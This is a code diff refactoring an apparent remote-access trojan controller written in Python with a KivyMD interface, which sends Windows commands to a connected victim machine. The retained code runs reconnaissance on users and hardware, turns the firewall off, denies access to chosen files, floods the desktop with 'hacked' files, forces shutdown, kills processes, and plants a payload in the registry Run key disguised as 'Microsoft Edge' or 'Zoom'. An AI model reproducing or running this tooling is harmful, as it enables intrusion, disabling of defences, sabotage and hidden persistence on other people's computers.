@@ -93,11 +93,6 @@ ScreenManager:
                     id: biosBtn
                     text: "BIOS Information"
                     on_release: app.BIOSInfo()
-                    
-                OneLineListItem:
-                    id: testBtn
-                    text: "Test"
-                    on_release: app.Test()
 
         MDTextField:
             id: consoleField
@@ -239,25 +234,13 @@ class Main(MDApp):
         self.currConn.send(command.encode())
         print('Command sent to client: ', command)
         recvsize = self.currConn.recv(1024).decode()
-        print(recvsize)
 
         data = self.currConn.recv(1024)
         while sys.getsizeof(data) < int(recvsize):
-            print(sys.getsizeof(data))
             data += self.currConn.recv(1024)
         output = data.decode()
         return output
 
-    def Test(self):
-        while True:
-            # Reset console
-            self.root.ids.consoleField.text = ''
-            output = self.sendCommand(command='tasklist')
-
-            print('Output: ', output)
-            self.root.ids.consoleField.text = output
-
-            break
 
     # Juls shizzle
     # This is to gather the client's information about their network
@@ -267,11 +250,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = ''
 
             # Get IPconfig Information
-            command = 'ipconfig /all'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command='ipconfig /all')
 
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -285,23 +264,15 @@ class Main(MDApp):
 
             # Get Host/Machine Name
             command = 'systeminfo | findstr /C:"Host Name"'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Get OS Information
             command = 'systeminfo | findstr /C:"OS"'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.sendCommand(command=command)
 
             # Get Processor Information
             command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
-            self.currConn.send(command.encode())
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize3)).decode()
+            output3 = self.sendCommand(command=command)
 
             # Print results
             print('Output:')
@@ -320,10 +291,7 @@ class Main(MDApp):
 
             # Get GPU Name, Description & Version
             command = 'wmic path win32_VideoController get name,Description,DriverVersion'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print results
             print('Output:')
@@ -341,10 +309,7 @@ class Main(MDApp):
 
             # Get CPU Load Percentage
             command = 'wmic cpu get loadpercentage'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -358,12 +323,7 @@ class Main(MDApp):
 
             # Get List of Task
             command = 'tasklist'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            print(recvsize)
-            output = self.currConn.recv(int(recvsize)).decode()
-            print(sys.getsizeof(output))
+            output = self.sendCommand(command=command)
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
@@ -376,12 +336,7 @@ class Main(MDApp):
 
             # Get list of services
             command = 'net start'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            print(recvsize)
-            output = self.currConn.recv(int(recvsize)).decode()
-            print(sys.getsizeof(output))
+            output = self.sendCommand(command=command)
 
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -395,10 +350,7 @@ class Main(MDApp):
 
             # Get list of security policy
             command = 'net accounts'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             print('Output: ', output)
             self.root.ids.consoleField.text = output
@@ -412,23 +364,15 @@ class Main(MDApp):
 
             # Memory status
             command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Available memory
             command = 'systeminfo | findstr /C:"Available Physical Memory"'
-            self.currConn.send(command.encode())
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.sendCommand(command=command)
 
             # Cache
             command = 'wmic cpu get L2CacheSize, L3CacheSize'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize3 = self.currConn.recv(1024).decode()
-            output3 = self.currConn.recv(int(recvsize3)).decode()
+            output3 = self.sendCommand(command=command)
 
             # Print result
             print('Output:')
@@ -448,16 +392,11 @@ class Main(MDApp):
 
             # Get Username, Fullname, Last Login
             command = 'net user "%USERNAME%"'
-            self.currConn.send(command.encode())
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize2 = self.currConn.recv(1024).decode()
-            output2 = self.currConn.recv(int(recvsize2)).decode()
+            output2 = self.sendCommand(command=command)
             output2 = output2.splitlines()
 
             # Print results
@@ -476,10 +415,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = ''
 
             command = 'wmic useraccount get domain,name,sid,status,passwordchangeable,passwordexpires,passwordrequired,localaccount'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             print('Output: \n', output)
             self.root.ids.consoleField.text = output
@@ -492,10 +428,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = ''
 
             command = 'wmic bios get manufacturer,name,primarybios,serialnumber,version,smbiospresent,status'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             print('Output: \n', output)
             self.root.ids.consoleField.text = output
@@ -510,10 +443,7 @@ class Main(MDApp):
             self.root.ids.disruptConsoleField.text = ''
 
             command = "netsh advfirewall set allprofiles state off"
-            self.currConn.send(command.encode())
-            print('[+] Command sent')
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print(f"Output: {output}")
@@ -547,10 +477,7 @@ class Main(MDApp):
     def ExecuteDenyFiles(self):
         while True:
             command = 'cacls ' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print('Output: ', output)
@@ -567,10 +494,7 @@ class Main(MDApp):
 
             # Change to () for infinite loop
             command = 'FOR /L %A IN (1 1 10) DO (start msedge)'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print('Output: ', output)
@@ -586,10 +510,7 @@ class Main(MDApp):
 
             # Replace 20 with a larger number for actual attack
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_got_hacked_by_eggs_%A.txt)'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print('Output: ', output)
@@ -605,10 +526,7 @@ class Main(MDApp):
 
             # /t is Timer
             command = 'shutdown /s /t 00'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print('Output: ', output)
@@ -642,10 +560,7 @@ class Main(MDApp):
     def ExecuteKillTask(self):
         while True:
             command = 'taskkill /im ' + self.killTaskDialog.content_cls.ids.taskKillProcessID.text + ' /F'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            output = self.currConn.recv(int(recvsize)).decode()
+            output = self.sendCommand(command=command)
 
             # Print Results
             print('Output: ', output)
@@ -663,9 +578,7 @@ class Main(MDApp):
         while True:
             # Check if payload is already on the target machine
             command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
-            self.currConn.send(command.encode())
-            recvsize = self.currConn.recv(1024).decode()
-            isExist = self.currConn.recv(int(recvsize)).decode()
+            isExist = self.sendCommand(command=command)
 
             # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
@@ -699,12 +612,7 @@ class Main(MDApp):
 
                 # Add payload to registry to run on login
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
-                self.currConn.send(command.encode())
-                comsent2 = str('\nCommand sent to client: ' + command)
-                print(comsent2)
-                self.root.ids.disruptConsoleField.text += comsent2
-                recvsize = self.currConn.recv(1024).decode()
-                output = self.currConn.recv(int(recvsize)).decode()
+                output = self.sendCommand(command=command)
                 output = str('\nRegistry add: ' + output)
                 print(output)
                 self.root.ids.disruptConsoleField.text += output
@@ -767,10 +675,7 @@ class Main(MDApp):
         while True:
             # Check if payload is already on the target machine
             command = f'if exist {tpath.rstrip()} (echo True) else (echo False)'
-            self.currConn.send(command.encode())
-            print('Command sent to client: ', command)
-            recvsize = self.currConn.recv(1024).decode()
-            isExist = self.currConn.recv(int(recvsize)).decode()
+            isExist = self.sendCommand(command=command)
 
             # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
@@ -804,12 +709,7 @@ class Main(MDApp):
 
                 # Add payload to registry to run on login
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Zoom" /t REG_SZ /d "{tpath}" /f'
-                self.currConn.send(command.encode())
-                comsent = ('\nCommand sent to client: ' + command)
-                print(comsent)
-                self.root.ids.disruptConsoleField.text += comsent
-                recvsize = self.currConn.recv(1024).decode()
-                output = self.currConn.recv(int(recvsize)).decode()
+                output = self.sendCommand(command=command)
                 output = str('\nRegistry add: ' + output)
                 print(output)
                 self.root.ids.disruptConsoleField.text += output
@@ -852,4 +752,3 @@ class TaskKillContent(BoxLayout):
 
 if __name__ == '__main__':
     Main().run()
-
